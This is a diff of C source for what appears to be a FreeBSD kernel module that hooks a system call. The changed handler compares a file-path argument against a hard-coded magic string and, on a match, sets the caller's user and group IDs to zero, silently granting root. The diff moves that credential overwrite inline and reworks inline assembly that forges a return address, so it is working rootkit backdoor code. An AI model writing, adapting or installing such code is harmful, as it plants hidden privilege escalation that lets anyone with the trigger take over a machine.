@@ -6,32 +6,18 @@
 #include <sys/pcpu.h>
 #include <sys/sysent.h>
 
-static void
-escalate(struct thread *td) {
-
-    td->td_ucred->cr_uid =
-        td->td_ucred->cr_ruid =
-        td->td_ucred->cr_svuid =
-        td->td_ucred->cr_gid =
-        td->td_ucred->cr_rgid =
-        td->td_ucred->cr_svgid =
-        0u;
-}
-
 static int
 __attribute__ ((noinline)) dummyret(struct thread *td) {
     return (td == (void *) NULL) ? 1 : 0;
 }
 
 static void
-__attribute__ ((noinline)) get_pc_edi() {
-    __asm__ volatile ("mov 4(%esp), %edi");
+__attribute__ ((noinline)) get_pc_ecx() {
+    __asm__ volatile ("mov 4(%esp), %ecx");
 }
 
 static int
 new_sy_call(struct thread *td, void *syscall_args) {
-
-    __asm__ volatile ("push %edi");
 
     struct sc_args {
         int fd;
@@ -43,9 +29,9 @@ new_sy_call(struct thread *td, void *syscall_args) {
     struct sc_args *args;
     char * str;
 
-    get_pc_edi();
-    __asm__ volatile ("addl $36, %edi"); // TODO get exact value to add
-    __asm__ volatile ("push %edi"); // push return address
+    get_pc_ecx();
+    __asm__ volatile ("addl $36, %ecx"); // TODO get exact value to add
+    __asm__ volatile ("push %ecx"); // push return address
 
     // sy_call_t *openat_sy_call = (sy_call_t *)(0xc0c42820 + 5);                 
     // retval = (*openat_sy_call)(td, syscall_args);
@@ -93,16 +79,23 @@ new_sy_call(struct thread *td, void *syscall_args) {
         str[3] == '5' &&                                                      
         str[4] == 'b' &&                                                      
         str[5] == '1') {                                                      
-        escalate(td);                                                         
-    }                                                                         
+
+        td->td_ucred->cr_uid =
+            td->td_ucred->cr_ruid =
+            td->td_ucred->cr_svuid =
+            td->td_ucred->cr_gid =
+            td->td_ucred->cr_rgid =
+            td->td_ucred->cr_svgid =
+            0u;
+    }
 
 returnlabel:
-    __asm__ volatile ("pop %edi");
     return (retval);                                                          
 }
 
 static void
 p32(uint8_t bytes[], void *addr) {
+
     uint32_t addr32 = (uint32_t) addr;
     bytes[0] = addr32 & 0xff;
     bytes[1] = (addr32 >> 8) & 0xff;
